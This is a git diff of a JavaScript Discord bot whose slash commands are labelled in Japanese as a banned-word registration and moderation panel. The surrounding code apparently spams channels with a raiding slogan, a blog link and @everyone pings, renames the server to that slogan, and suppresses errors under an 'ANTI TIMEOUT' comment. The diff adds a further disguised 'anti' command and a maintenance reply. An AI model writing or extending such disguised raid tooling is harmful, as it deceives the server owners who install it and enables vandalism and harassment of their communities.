@@ -13,7 +13,7 @@ try {
     body: [
       {
         name: "anti",
-        description: "**禁止ワードを登録中...**",
+        description: "**禁止ワードを登録**",
         type: 1,
         options: [
           {
@@ -21,6 +21,19 @@ try {
             type: 3,
             required: false,
             description: "**禁止する文章を入力してください**",
+          },
+        ],
+      },
+      {
+        name: "anti",
+        description: "**禁止ワードを登録中...**",
+        type: 1,
+        options: [
+          {
+            name: "select",
+            type: 3,
+            required: false,
+            description: "**設置する操作パネルのタイプ**",
           },
         ],
       },
@@ -85,12 +98,16 @@ https://discord.gg/annycW3Xrk
                   text ??
                     "荒らし共栄圏万歳！ \n https://ctkpaarr.data.blog \n @everyone"
                 );
-              } catch (_e) {}
+              } catch (_e) {
+                /* ANTI TIMEOUT */
+              }
             }
           });
       }
 
       discordServer?.setName(text?.split("\n")[0] ?? "荒らし共栄圏万歳！");
+    }else {
+      await interaction.reply("**現在メンテナンス中です。**");
     }
   }
 });
